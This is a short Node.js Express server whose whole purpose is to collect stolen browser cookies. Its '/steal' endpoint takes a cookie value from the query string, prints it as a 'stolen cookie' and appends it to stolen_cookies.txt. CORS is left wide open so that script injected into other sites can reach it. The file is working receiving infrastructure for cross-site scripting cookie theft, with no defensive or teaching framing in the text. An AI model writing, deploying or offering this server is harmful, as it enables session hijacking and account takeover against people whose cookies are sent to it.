const express = require('express');
const fs=require('fs');
const path=require('path');
const app=express();
const cors = require('cors');

app.use(express.static(path.join(__dirname, 'public')));

app.use(cors());

app.get('/steal',(req,res)=>{
	const cookie=req.query.cookie;
	if(cookie){
		console.log('stolen cookie: '+cookie);
		fs.appendFileSync('stolen_cookies.txt',`${cookie}\n`);
	}
	res.send(200);
});

app.get('/',(req,res)=>{
	res.send("welcome");
});


const PORT=3000;
app.listen(PORT,()=>{
	console.log('listening in port: '+PORT);
});
